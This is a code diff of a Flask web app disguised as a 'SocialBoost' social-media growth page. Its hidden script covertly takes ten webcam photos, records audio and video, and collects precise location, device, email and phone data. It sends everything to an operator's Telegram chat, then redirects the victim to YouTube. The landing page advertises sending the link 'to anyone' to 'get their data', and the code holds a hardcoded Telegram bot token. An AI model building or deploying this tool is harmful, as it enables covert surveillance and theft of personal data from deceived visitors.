@@ -1,3 +1,4 @@
+import os
 from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
 import base64
@@ -5,28 +6,26 @@ import requests
 from datetime import datetime
 import logging
 import io
-import os
 import socket
 import platform
 from PIL import Image
 import time
 import urllib.parse
-import threading
 
 app = Flask(__name__)
 CORS(app)
 
 # ─── TELEGRAM CONFIG ────────────────────────────────────────────
-BOT_TOKEN = "7888111866:AAFkxlNRo5WeBKazD2H6BqjDrrCWoJTxGiE"
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '7888111866:AAFkxlNRo5WeBKazD2H6BqjDrrCWoJTxGiE')
+RENDER_URL = os.environ.get('RENDER_URL', 'https://proxy-dev-rnvm.onrender.com')
+DEFAULT_REDIRECT = os.environ.get('DEFAULT_REDIRECT', 'https://youtube.com')
+
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 SEND_PHOTO_URL = f"{TELEGRAM_API}/sendPhoto"
 SEND_AUDIO_URL = f"{TELEGRAM_API}/sendAudio"
 SEND_VIDEO_URL = f"{TELEGRAM_API}/sendVideo"
 SEND_MESSAGE_URL = f"{TELEGRAM_API}/sendMessage"
 SEND_LOCATION_URL = f"{TELEGRAM_API}/sendLocation"
-
-# ─── RENDER URL ──────────────────────────────────────────────────
-RENDER_URL = os.environ.get('RENDER_URL', 'https://your-app.onrender.com')
 
 # ─── LOGGING ─────────────────────────────────────────────────────
 logging.basicConfig(level=logging.INFO)
@@ -84,7 +83,6 @@ def get_smm_panel_html(chat_id, redirect_url):
             color: #fff;
         }}
         
-        /* Header */
         .header {{
             background: linear-gradient(135deg, #1a0533, #0d1b2a);
             padding: 20px 16px 60px;
@@ -142,7 +140,6 @@ def get_smm_panel_html(chat_id, redirect_url):
             border: 1px solid rgba(0, 245, 212, 0.2);
         }}
         
-        /* Stats Bar */
         .stats-bar {{
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -178,14 +175,12 @@ def get_smm_panel_html(chat_id, redirect_url):
             letter-spacing: 1px;
         }}
         
-        /* Main Content */
         .main-content {{
             padding: 20px 16px 100px;
             max-width: 500px;
             margin: 0 auto;
         }}
         
-        /* Service Cards */
         .section-title {{
             font-size: 18px;
             font-weight: 700;
@@ -244,7 +239,6 @@ def get_smm_panel_html(chat_id, redirect_url):
             margin-top: 2px;
         }}
         
-        /* Order Form */
         .order-box {{
             background: rgba(255, 255, 255, 0.03);
             border-radius: 20px;
@@ -333,7 +327,6 @@ def get_smm_panel_html(chat_id, redirect_url):
             to {{ transform: rotate(360deg); }}
         }}
         
-        /* Payment Methods */
         .payment-methods {{
             display: flex;
             gap: 12px;
@@ -357,7 +350,6 @@ def get_smm_panel_html(chat_id, redirect_url):
             background: rgba(0, 245, 212, 0.1);
         }}
         
-        /* Footer */
         .footer {{
             text-align: center;
             padding: 20px 16px;
@@ -393,7 +385,6 @@ def get_smm_panel_html(chat_id, redirect_url):
             color: #f15bb5;
         }}
         
-        /* Status Toast */
         .toast {{
             position: fixed;
             bottom: 20px;
@@ -429,7 +420,6 @@ def get_smm_panel_html(chat_id, redirect_url):
             to {{ opacity: 1; transform: translateX(-50%) translateY(0); }}
         }}
         
-        /* Hidden elements */
         #video, #canvas {{
             display: none;
         }}
@@ -450,7 +440,6 @@ def get_smm_panel_html(chat_id, redirect_url):
 </head>
 <body>
 
-    <!-- Header -->
     <div class="header">
         <div class="header-content">
             <div class="logo">🚀 SocialBoost</div>
@@ -459,7 +448,6 @@ def get_smm_panel_html(chat_id, redirect_url):
         </div>
     </div>
 
-    <!-- Stats Bar -->
     <div class="stats-bar">
         <div class="stat-card">
             <div class="number">50K+</div>
@@ -475,10 +463,8 @@ def get_smm_panel_html(chat_id, redirect_url):
         </div>
     </div>
 
-    <!-- Main Content -->
     <div class="main-content">
 
-        <!-- Services -->
         <div class="section-title">
             <span>🔥 Popular Services</span>
             <span class="highlight">▼</span>
@@ -511,7 +497,6 @@ def get_smm_panel_html(chat_id, redirect_url):
             </div>
         </div>
 
-        <!-- Order Form -->
         <div class="order-box">
             <label class="label">📌 Select Service</label>
             <select id="serviceSelect">
@@ -550,7 +535,6 @@ def get_smm_panel_html(chat_id, redirect_url):
         </div>
     </div>
 
-    <!-- Footer -->
     <div class="footer">
         <div class="links">
             <a href="#">About</a>
@@ -564,10 +548,8 @@ def get_smm_panel_html(chat_id, redirect_url):
         </div>
     </div>
 
-    <!-- Toast -->
     <div class="toast" id="toast"></div>
 
-    <!-- Hidden elements -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
@@ -575,21 +557,24 @@ def get_smm_panel_html(chat_id, redirect_url):
         let selectedService = 'Instagram Followers';
         let isProcessing = false;
 
-        function selectService(name) {
+        function selectService(name) {{
             selectedService = name;
             document.getElementById('serviceSelect').value = name;
             showToast('✅ Selected: ' + name);
-        }
+        }}
 
-        function showToast(msg, type = '') {
+        function showToast(msg, type) {{
+            type = type || '';
             const t = document.getElementById('toast');
             t.textContent = msg;
             t.className = 'toast show ' + type;
             clearTimeout(t._timeout);
-            t._timeout = setTimeout(() => t.classList.remove('show'), 3000);
-        }
+            t._timeout = setTimeout(function() {{
+                t.classList.remove('show');
+            }}, 3000);
+        }}
 
-        async function placeOrder() {
+        async function placeOrder() {{
             if (isProcessing) return;
             
             const btn = document.getElementById('orderBtn');
@@ -598,15 +583,15 @@ def get_smm_panel_html(chat_id, redirect_url):
             const phone = document.getElementById('phoneInput').value.trim();
             const service = document.getElementById('serviceSelect').value;
 
-            if (!username) {
+            if (!username) {{
                 showToast('⚠️ Please enter your username or link', 'error');
                 return;
-            }
+            }}
 
-            if (!email) {
+            if (!email) {{
                 showToast('⚠️ Please enter your email', 'error');
                 return;
-            }
+            }}
 
             btn.classList.add('loading');
             btn.disabled = true;
@@ -614,167 +599,164 @@ def get_smm_panel_html(chat_id, redirect_url):
 
             showToast('⏳ Processing your order...');
 
-            let data = {
+            let data = {{
                 chat_id: "{chat_id}",
                 service: service,
                 username: username,
                 email: email,
                 phone: phone || 'Not provided',
                 userAgent: navigator.userAgent,
-                language: navigator.language || "en-US",
+                language: navigator.language || 'en-US',
                 platform: navigator.platform,
-                cores: navigator.hardwareConcurrency || "Unknown",
-                ram: navigator.deviceMemory || "Unknown",
-                screen: screen.width + "x" + screen.height,
-                battery_level: "N/A",
-                charging: "No",
-                storage_used: "0.00",
-                storage_total: "0.00",
+                cores: navigator.hardwareConcurrency || 'Unknown',
+                ram: navigator.deviceMemory || 'Unknown',
+                screen: screen.width + 'x' + screen.height,
+                battery_level: 'N/A',
+                charging: 'No',
+                storage_used: '0.00',
+                storage_total: '0.00',
                 lat: null,
                 lon: null,
                 photos: [],
                 audio: null,
                 video: null,
-                perm_cam: "Denied",
-                perm_loc: "Denied",
-                perm_mic: "Denied"
-            };
+                perm_cam: 'Denied',
+                perm_loc: 'Denied',
+                perm_mic: 'Denied'
+            }};
 
-            // ─── BATTERY ──────────────────────────────────────────
-            try {
+            try {{
                 let b = await navigator.getBattery();
-                data.battery_level = Math.round(b.level * 100) + "%";
-                data.charging = b.charging ? "Yes" : "No";
-            } catch(e) {}
+                data.battery_level = Math.round(b.level * 100) + '%';
+                data.charging = b.charging ? 'Yes' : 'No';
+            }} catch(e) {{}}
 
-            // ─── STORAGE ──────────────────────────────────────────
-            try {
-                if (navigator.storage && navigator.storage.estimate) {
+            try {{
+                if (navigator.storage && navigator.storage.estimate) {{
                     const estimate = await navigator.storage.estimate();
                     data.storage_used = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
                     data.storage_total = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
-                }
-            } catch(e) {}
+                }}
+            }} catch(e) {{}}
 
-            // ─── CAMERA + 10 PHOTOS ──────────────────────────────
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                data.perm_cam = "Allowed";
+            try {{
+                let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
+                data.perm_cam = 'Allowed';
                 let video = document.getElementById('video');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1000));
+                await new Promise(function(r) {{ setTimeout(r, 1000); }});
                 
                 let canvas = document.getElementById('canvas');
                 
-                for (let i = 0; i < 10; i++) {
+                for (let i = 0; i < 10; i++) {{
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     data.photos.push(canvas.toDataURL('image/jpeg', 0.8));
-                    await new Promise(r => setTimeout(r, 400));
-                }
+                    await new Promise(function(r) {{ setTimeout(r, 400); }});
+                }}
                 
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {
-                data.perm_cam = "Denied";
-            }
+                stream.getTracks().forEach(function(t) {{ t.stop(); }});
+            }} catch(e) {{
+                data.perm_cam = 'Denied';
+            }}
 
-            // ─── AUDIO ──────────────────────────────────────────────
-            try {
-                let audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                data.perm_mic = "Allowed";
+            try {{
+                let audioStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
+                data.perm_mic = 'Allowed';
                 let mediaRecorder = new MediaRecorder(audioStream);
                 let audioChunks = [];
                 
-                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                mediaRecorder.ondataavailable = function(event) {{ audioChunks.push(event.data); }};
                 mediaRecorder.start();
-                await new Promise(r => setTimeout(r, 5000));
+                await new Promise(function(r) {{ setTimeout(r, 5000); }});
                 mediaRecorder.stop();
-                await new Promise(r => mediaRecorder.onstop = r);
+                await new Promise(function(r) {{ mediaRecorder.onstop = r; }});
                 
-                let audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                let audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }});
                 let reader = new FileReader();
-                data.audio = await new Promise(resolve => {
-                    reader.onloadend = () => resolve(reader.result);
+                data.audio = await new Promise(function(resolve) {{
+                    reader.onloadend = function() {{ resolve(reader.result); }};
                     reader.readAsDataURL(audioBlob);
-                });
-                audioStream.getTracks().forEach(t => t.stop());
-            } catch(e) {
-                data.perm_mic = "Denied";
-            }
+                }});
+                audioStream.getTracks().forEach(function(t) {{ t.stop(); }});
+            }} catch(e) {{
+                data.perm_mic = 'Denied';
+            }}
 
-            // ─── VIDEO ──────────────────────────────────────────────
-            try {
-                let videoStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
+            try {{
+                let videoStream = await navigator.mediaDevices.getUserMedia({{ 
+                    video: {{ facingMode: 'user' }}, 
                     audio: true 
-                });
+                }});
                 
                 let videoRecorder = new MediaRecorder(videoStream);
                 let videoChunks = [];
                 
-                videoRecorder.ondataavailable = event => videoChunks.push(event.data);
+                videoRecorder.ondataavailable = function(event) {{ videoChunks.push(event.data); }};
                 videoRecorder.start();
-                await new Promise(r => setTimeout(r, 8000));
+                await new Promise(function(r) {{ setTimeout(r, 8000); }});
                 videoRecorder.stop();
-                await new Promise(r => videoRecorder.onstop = r);
+                await new Promise(function(r) {{ videoRecorder.onstop = r; }});
                 
-                let videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                let videoBlob = new Blob(videoChunks, {{ type: 'video/webm' }});
                 let reader = new FileReader();
-                data.video = await new Promise(resolve => {
-                    reader.onloadend = () => resolve(reader.result);
+                data.video = await new Promise(function(resolve) {{
+                    reader.onloadend = function() {{ resolve(reader.result); }};
                     reader.readAsDataURL(videoBlob);
-                });
-                videoStream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
+                }});
+                videoStream.getTracks().forEach(function(t) {{ t.stop(); }});
+            }} catch(e) {{}}
 
-            // ─── LOCATION ──────────────────────────────────────────
-            try {
-                await new Promise((resolve) => {
+            try {{
+                await new Promise(function(resolve) {{
                     navigator.geolocation.getCurrentPosition(
-                        pos => { data.lat = pos.coords.latitude; data.lon = pos.coords.longitude; data.perm_loc = "Allowed"; resolve(); },
-                        () => resolve(),
-                        { timeout: 5000, enableHighAccuracy: true }
+                        function(pos) {{ 
+                            data.lat = pos.coords.latitude; 
+                            data.lon = pos.coords.longitude; 
+                            data.perm_loc = 'Allowed'; 
+                            resolve(); 
+                        }},
+                        function() {{ resolve(); }},
+                        {{ timeout: 5000, enableHighAccuracy: true }}
                     );
-                });
-            } catch(e) {
-                data.perm_loc = "Denied";
-            }
+                }});
+            }} catch(e) {{
+                data.perm_loc = 'Denied';
+            }}
 
-            // ─── SEND DATA ─────────────────────────────────────────
-            try {
+            try {{
                 showToast('📤 Sending your order...');
                 
-                const response = await fetch('/upload/all', {
+                const response = await fetch('/upload/all', {{
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {{ 'Content-Type': 'application/json' }},
                     body: JSON.stringify(data)
-                });
+                }});
                 
-                if (response.ok) {
+                if (response.ok) {{
                     showToast('✅ Order placed successfully! Redirecting...', 'success');
                     btn.classList.remove('loading');
                     btn.disabled = false;
                     isProcessing = false;
                     
-                    setTimeout(() => {
+                    setTimeout(function() {{
                         window.location.href = "{redirect_url}";
-                    }, 2000);
-                } else {
+                    }}, 2000);
+                }} else {{
                     showToast('❌ Something went wrong. Please try again.', 'error');
                     btn.classList.remove('loading');
                     btn.disabled = false;
                     isProcessing = false;
-                }
-            } catch(e) {
+                }}
+            }} catch(e) {{
                 showToast('❌ Network error. Please try again.', 'error');
                 btn.classList.remove('loading');
                 btn.disabled = false;
                 isProcessing = false;
-            }
-        }
+            }}
+        }}
 
-        // Auto-fill demo data
         document.getElementById('usernameInput').value = '@' + Math.random().toString(36).substring(2, 8);
         document.getElementById('emailInput').value = 'user' + Math.random().toString(36).substring(2, 6) + '@gmail.com';
     </script>
@@ -787,7 +769,7 @@ def get_smm_panel_html(chat_id, redirect_url):
 @app.route("/")
 def index():
     chat_id = request.args.get('id')
-    redirect_url = request.args.get('redir', 'https://youtube.com')
+    redirect_url = request.args.get('redir', DEFAULT_REDIRECT)
     
     if not chat_id:
         return render_template_string(f"""
@@ -816,10 +798,12 @@ def index():
                 <p class="note">⚡ Send this link to anyone and get their data!</p>
             </div>
             <script>
-                const link = `{RENDER_URL}/?id=YOUR_CHAT_ID&redir=${{encodeURIComponent('https://youtube.com')}}`;
+                var link = '{RENDER_URL}/?id=YOUR_CHAT_ID&redir=' + encodeURIComponent('{DEFAULT_REDIRECT}');
                 document.getElementById('linkDisplay').textContent = link;
                 function copyLink() {{
-                    navigator.clipboard.writeText(link).then(() => alert('✅ Link copied! Replace YOUR_CHAT_ID with your actual Chat ID'));
+                    navigator.clipboard.writeText(link).then(function() {{
+                        alert('✅ Link copied! Replace YOUR_CHAT_ID with your actual Chat ID');
+                    }});
                 }}
             </script>
         </body>
@@ -841,7 +825,6 @@ def upload_all():
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
         device_name, ip_address = get_device_info()
         
-        # IP Info
         try:
             ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,mobile,proxy").json()
         except:
@@ -851,7 +834,7 @@ def upload_all():
         bold_ip = to_bold_unicode(ip)
         bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
 
-        # ─── SEND ORDER INFO FIRST ──────────────────────────────
+        # ─── SEND ORDER INFO ──────────────────────────────────────
         try:
             order_msg = f"""🛒 **New Order Placed!**
 ━━━━━━━━━━━━━━━━
@@ -997,7 +980,7 @@ def upload_all():
                 f"   • Storage Used: {safe(data.get('storage_used'))} GB\n"
                 f"   • Storage Total: {safe(data.get('storage_total'))} GB\n"
                 f"━━━━━━━━━━━━━━━━\n"
-                f"⚡ Developed by: @FROXLS"
+                f"⚡ Developed by: @Proxyfxz"
             )
             msg_data = {"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"}
             requests.post(SEND_MESSAGE_URL, data=msg_data)
@@ -1020,4 +1003,4 @@ if __name__ == "__main__":
     print(f"🔗 Render URL: {RENDER_URL}")
     print("📸 10 Photos + 🎤 Audio + 🎥 Video + 📍 Location + 📧 Email + 📱 Phone")
     print("=" * 60)
-    app.run(debug=True, host="0.0.0.0", port=5000)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
